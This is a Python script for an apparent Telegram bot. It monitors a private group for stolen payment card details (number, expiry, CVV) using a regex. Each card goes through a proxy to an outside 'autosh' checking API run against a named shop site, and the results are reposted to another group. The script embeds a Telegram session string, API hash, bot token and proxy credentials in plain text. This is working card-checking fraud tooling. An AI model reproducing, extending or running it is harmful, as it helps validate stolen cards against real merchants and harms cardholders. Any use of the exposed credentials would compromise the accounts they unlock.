import re
import aiohttp
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Bot

# ---------------- CONFIG ----------------
# Telethon user session (to read private group)
api_id = 17455551                 # Get from https://my.telegram.org
api_hash = "abde39d2fad230528b2695a14102e76a"      # Get from https://my.telegram.org
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="  # Generated session string

# Bot token (to send messages to official group)
BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"

# Groups
PRIVATE_GROUP_ID = -1002682944548  # Private group to monitor
TARGET_GROUP_ID = -1002554243871   # Your official group ID

# API config
API_URL = "https://autosh.arpitchk.shop/puto.php"
SITE = "https://jasonwubeauty.com"
PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"

# Regex to match card format: 16 digits|MM|YYYY|CVV
CARD_REGEX = re.compile(r"(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})")

# ---------------- INIT CLIENTS ----------------
user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
bot_client = Bot(token=BOT_TOKEN)

# ---------------- FUNCTIONS ----------------
async def process_card(card: str):
    """
    Sends the card to API and posts the response in official group
    """
    params = {
        "site": SITE,
        "cc": card,
        "proxy": PROXY
    }

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(API_URL, params=params) as resp:
                data = await resp.json()
        except Exception as e:
            data = {
                "Response": f"API Error: {e}",
                "cc": card,
                "Price": "-",
                "TotalTime": "-"
            }

    # Format message
    msg = f"CC: `{data.get('cc')}`\nPrice: {data.get('Price')}\nResponse: {data.get('Response')}"
    
    # Send to official group
    await bot_client.send_message(
        chat_id=TARGET_GROUP_ID,
        text=msg,
        parse_mode="Markdown"
    )

# ---------------- EVENT HANDLER ----------------
@user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def card_listener(event):
    text = event.message.message
    if not text:
        return

    matches = CARD_REGEX.findall(text)
    if not matches:
        return

    # Process all cards in parallel
    tasks = []
    for match in matches:
        card_str = "|".join(match)
        tasks.append(asyncio.create_task(process_card(card_str)))
    await asyncio.gather(*tasks)

# ---------------- MAIN ----------------
if __name__ == "__main__":
    print("✅ Hybrid bot is running...")
    user_client.start()  # First run may ask for phone & code if session is new
    user_client.run_until_disconnected()
